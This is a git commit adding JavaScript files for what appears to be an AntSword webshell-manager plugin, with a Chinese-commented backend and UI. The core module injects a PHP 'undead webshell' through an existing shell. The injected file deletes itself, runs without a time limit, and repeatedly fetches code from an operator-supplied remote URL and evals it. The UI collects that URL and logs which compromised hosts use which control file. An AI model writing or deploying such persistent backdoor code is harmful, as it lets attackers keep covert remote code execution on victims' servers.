a550a2d646d20544dd519cf472cd956643fcbb4b
ph4ntom <45198234+phantom11235@users.noreply.github.com>
2019-08-07 17:46:33 +0800

    Add files via upload

---
+++ libs/core.js
@@ -0,0 +1,63 @@
+/**
+ * 核心模块
+ */
+
+class Core {
+  constructor(opt,argv) {
+    let self = this;
+    return new Promise((res, rej) => {
+      let core = new antSword['core'][opt['type']](opt);
+      switch (argv.type) {
+        case "rm_file":
+          this._save_remote_address(argv.rm_file,argv.shell);
+          var rm_file=argv.rm_file.toString().split("###")[0];
+          var timeout=argv.rm_file.toString().split("###")[1];
+          var patt=/^\d+$/;
+          var result=patt.test(timeout);
+          if (result){}
+          else{return rej("Unexpected value");break;}
+          core.request({
+              _: this._inject_und3ad(rm_file,timeout)}).then(res)
+              .catch((err)=>{return rej(err);});
+          core.request({
+            _: this._execute_und3ad()}).then(res)
+              .catch((err)=>{return rej(err);});
+          break;
+      }
+    })
+  }
+
+
+  //保存远程控制文件地址
+  _save_remote_address(address,shell){
+    var fs = require('fs');
+    var address=address.split("###")[0];
+    var file_name=__dirname+'\\..\\db\\rm_shell.txt';
+    fs.appendFile(file_name, shell+" : "+address+"\n",'utf-8', function (error) {
+      if (error) {
+        console.log('写入失败')
+      } else {
+        console.log('写入成功了')
+      }
+    })
+  }
+
+  //注入不死webshell
+  _inject_und3ad(rm_file,timeout){
+
+    return `
+    function Injector(){$myfile = fopen("testfile.php", "w");$txt = '<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);$remote_file = "${rm_file}";while($code = file_get_contents($remote_file)){@eval($code);sleep(${timeout});};?>';fwrite($myfile, $txt);};Injector();
+    `;
+
+  }
+
+  //执行不死webshell
+  _execute_und3ad(){
+    return `
+    include("testfile.php");
+    `;
+  }
+
+}
+
+module.exports = Core;
---
+++ libs/ui.js
@@ -0,0 +1,133 @@
+/**
+ * UI
+ */
+
+const WIN = require('ui/window');
+const LANG = require('../language/');
+const LANG_T = antSword["language"]['toastr'];
+
+
+class UI {
+  constructor(opt) {
+    // 创建窗口
+    this.opt=opt;
+    this.win = new WIN({
+      title: `${LANG['title']}----- ${opt['url']}`,
+      width: 666,
+      height: 200,
+    });
+    this.createMainLayout();
+    return {
+      onInject: (func) => {
+        this.bindToolbarClickHandler(func);
+      },
+      onAbout: () => {}
+    }
+  }
+
+  /**
+   * 创建界面
+   */
+  createMainLayout() {
+
+    //检查远端控制文件
+    let griddata = [];
+    const readline = require('readline');
+    var fs = require('fs');
+    const rl = readline.createInterface({
+      input: fs.createReadStream(__dirname+'\\..\\db\\rm_shell.txt')
+    });
+    rl.on('line', (line) => {
+      if (line.split(" : ")[0]==this.opt['url']){
+        var item = antSword.noxss(line.split(" : ")[1]);
+        griddata.push({
+          data:item.split('\t')
+        });
+        this.grid.clearAll();
+        this.grid.parse({
+          rows: griddata
+        }, "json");
+      }
+    });
+
+    //创建主界面其余元素
+    let layout = this.win.win.attachLayout('1C');
+    layout.cells('a').setText(`<i class="fa fa-bars"></i> ${LANG['cell']['path']}`);
+    this.createToolbar();
+    this.createGrid(layout.cells('a'));
+    this.layout=layout;
+
+  }
+
+  //创建grid
+  createGrid(cell) {
+    let grid = cell.attachGrid();
+    grid.setHeader(`
+      ${LANG['cell']['path']}
+    `);
+    grid.setNoHeader(true);
+    grid.setColTypes("ro");
+    grid.setColSorting('str');
+    grid.setInitWidths("666");
+    grid.setColAlign("left");
+    grid.enableMultiselect(true);
+    grid.enableBlockSelection(true);
+    grid.init();
+
+    this.grid = grid;
+  }
+
+
+  /**
+   * 工具栏
+   */
+  createToolbar() {
+    let toolbar = this.win.win.attachToolbar();
+    toolbar.loadStruct([
+      { id: 'new',type: 'button', text: LANG['toolbar']['new'], icon: 'plus-circle'}
+    ]);
+    this.toolbar = toolbar;
+  }
+
+  /**
+  * 监听按钮点击事件
+  * @param  {Function} callback [description]
+  * @return {[type]}            [description]
+  */
+  bindToolbarClickHandler(callback) {
+    let self = this;
+    this.toolbar.attachEvent('onClick', (id) => {
+      switch(id){
+      case "new":
+        layer.prompt({
+          value: "",
+          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["rm_file"]}`
+        },(value,i, e) => {
+          layer.close(i);
+          this.win.win.progressOn();
+          callback({
+            type:"rm_file",
+            rm_file: value,
+            shell:this.opt['url'],
+          }).then((result) => {
+            if(result){
+              this.win.win.progressOff();
+              toastr.success(LANG["message"]["inject_success"], LANG_T['success']);
+            }
+          }).catch((err) => {
+            if (err=="Unexpected value"){
+              toastr.error(LANG['error']['value_wrong'], antSword['language']['toastr']['error']);
+            }
+            else {
+              toastr.error(LANG['error']['wrong'], antSword['language']['toastr']['error']);
+            }
+            this.win.win.progressOff();})
+        });
+        break
+      }
+    });
+  }
+
+}
+
+module.exports = UI;
